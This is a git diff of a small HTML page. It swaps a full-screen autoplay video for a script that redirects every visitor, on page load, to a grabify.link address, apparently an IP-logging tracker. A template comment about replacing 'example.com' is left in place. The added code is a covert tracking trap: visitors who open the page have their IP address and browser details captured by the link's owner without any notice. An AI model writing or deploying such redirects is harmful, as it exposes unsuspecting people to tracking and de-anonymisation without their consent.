@@ -3,28 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Your Website Title</title>
-    <style>
-        body {
-            margin: 0;
-            overflow: hidden; /* Prevent scrollbars */
+    <title>Redirect Page</title>
+    <script>
+        // Replace 'https://example.com' with the URL you want to redirect to
+        const redirectURL = 'https://grabify.link/ZFKELL';
+
+        // Function to redirect to the specified URL
+        function redirectToWebsite() {
+            window.location.href = redirectURL;
         }
-        video {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            min-width: 100%;
-            min-height: 100%;
-            width: auto;
-            height: auto;
-            transform: translate(-50%, -50%);
-        }
-    </style>
+    </script>
 </head>
 <body>
-    <video autoplay loop>
-        <source src="./assets/youare.mp4" type="video/mp4">
-        Your browser does not support the video tag.
-    </video>
+    <!-- Call the redirectToWebsite function when the page loads -->
+    <script>
+        redirectToWebsite();
+    </script>
 </body>
 </html>
